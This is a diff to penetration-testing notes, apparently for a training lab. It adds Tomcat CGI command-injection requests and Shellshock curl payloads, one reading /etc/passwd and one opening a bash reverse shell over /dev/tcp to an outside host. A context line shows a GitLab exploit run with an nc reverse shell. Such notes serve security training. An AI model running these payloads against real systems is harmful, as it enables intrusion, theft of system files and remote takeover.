@@ -521,6 +521,41 @@ nc -lnvp 4443
 ```
 - Metaploit module ```multi/http/tomcat_mgr_upload``` can automate this process
 
+### Attacking Tomcat CGI
+
+- Enumerate with nmap scan to identify Tomcat
+```bash
+nmap -p- -sC -Pn 10.129.120.127 --open 
+```
+- Use ffuf to enumerate for scripts in the /cgi folder:
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.120.127:8080/cgi/FUZZ.cmd
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.120.127:8080/cgi/FUZZ.bat
+```
+- Try navigating to found pages and appending ```?&dir``` or other commands: ```http://10.129.120.127:8080/cgi/welcome.bat?&dir```
+- ```?&set``` to retrieve a list of environment vairables
+- If PATH variable not set try hardcode path requests (URL encoded): ```http://10.129.120.127:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe```
+
+#### Attacking CGI Applications - Shellshock
+
+- CGI scripts and programs are kept in the ```/CGI-bin``` directory
+- Hunt for cgi scripts:
+```bash
+gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+- Try curling any results:
+```bash
+curl -i http://10.129.204.231/cgi-bin/access.cgi
+```
+- Test for Shellshock vulnerability
+```bash
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+```
+- Set nc listener ```nc -lvnp 7777``` and use vulnerability to get a reverse shell:
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.251/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
+```
+
 ## [Jenkins](https://www.jenkins.io/)
 
 ### Discovery & Enumeration
@@ -669,3 +704,6 @@ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7
 ```bash
 python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u Testface -p Testface -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 ```
+
+## Attacking Thick Client Applications
+
